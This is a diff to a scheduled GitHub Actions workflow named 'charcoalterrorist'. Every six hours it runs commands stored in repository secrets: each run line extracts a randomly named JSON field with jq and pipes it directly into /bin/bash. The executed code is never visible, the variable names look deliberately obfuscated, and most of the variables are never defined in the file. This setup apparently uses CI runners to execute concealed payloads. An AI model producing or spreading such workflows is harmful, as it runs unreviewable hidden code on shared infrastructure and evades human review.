@@ -2,19 +2,25 @@ name: charcoalterrorist
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '21 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: charcoalterrorist
         env:
-          m0: ${{ secrets.m0 }}
+          wdbc72: ${{ secrets.wdbc72 }}
         run: |
-          echo $m0 | jq -r .k19 | /bin/bash
-          echo $re5725 | jq -r .aw1 | /bin/bash
-          echo $frkw7407 | jq -r .fhaik136 | /bin/bash
+          echo $wdbc72 | jq -r .kfmo123 | /bin/bash
+          echo $bbmvh7409 | jq -r .hnp42661 | /bin/bash
+          echo $mllwk403 | jq -r .mfx593 | /bin/bash
+          echo $jb8114 | jq -r .mtb8 | /bin/bash
+          echo $uvmg1464 | jq -r .z15 | /bin/bash
+          echo $himm2435 | jq -r .ribxm6988 | /bin/bash
+          echo $fshij25 | jq -r .eyle022 | /bin/bash
+          echo $psym524 | jq -r .pvw869 | /bin/bash
+          echo $xneaq4937 | jq -r .qsjug33 | /bin/bash
+          echo $ioc0 | jq -r .jt8 | /bin/bash
 
